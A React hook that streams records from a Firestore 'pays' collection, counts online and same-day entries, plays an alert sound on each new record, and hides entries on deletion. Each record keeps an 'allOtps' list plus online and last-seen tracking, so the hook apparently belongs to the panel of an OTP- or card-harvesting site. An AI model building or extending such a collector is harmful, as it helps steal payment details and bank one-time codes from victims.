"use client"

import { useState, useEffect, useMemo } from "react"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { db } from "@/lib/firestore"
import { toast } from "@/hooks/use-toast"
import { playNotificationSound } from "@/lib/actions"
import { PaymentDocument } from "@/type/payment"

export function usePayments() {
  const [payments, setPayments] = useState<PaymentDocument[]>([])
  const [isLoading, setIsLoading] = useState(true)

  const stats: any = useMemo(() => {
    const today = new Date().toDateString()
    return {
      total: payments.length,
      connected: payments.filter((p) => p.online).length,
      today: payments.filter((p) => {
        const paymentDate = new Date(p.createdDate).toDateString()
        return today === paymentDate
      }).length,
    }
  }, [payments])

  useEffect(() => {
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const paymentsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data()
            return {
              id: doc.id,
              ...data,
              allOtps: data.allOtps || [],
              lastSeen: data.lastSeen || { sv: "unknown" },
            } as PaymentDocument
          })
          .filter((payment) => !payment?.isHidden)

        if (paymentsData.length > payments.length) {
          playNotificationSound()
        }

        setPayments(paymentsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching payments:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }, [payments.length])

  const deletePayment = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setPayments(payments.filter((payment) => payment.id !== id))
      toast({
        title: "تم مسح المدفوعة",
        description: "تم مسح المدفوعة بنجاح",
      })
    } catch (error) {
      console.error("Error hiding payment:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح المدفوعة",
        variant: "destructive",
      })
    }
  }

  const clearAllPayments = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      payments.forEach((payment) => {
        const docRef = doc(db, "pays", payment.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setPayments([])
      toast({
        title: "تم مسح جميع المدفوعات",
        description: "تم مسح جميع المدفوعات بنجاح",
      })
    } catch (error) {
      console.error("Error hiding all payments:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح المدفوعات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  return {
    payments,
    stats,
    isLoading,
    deletePayment,
    clearAllPayments,
  }
}
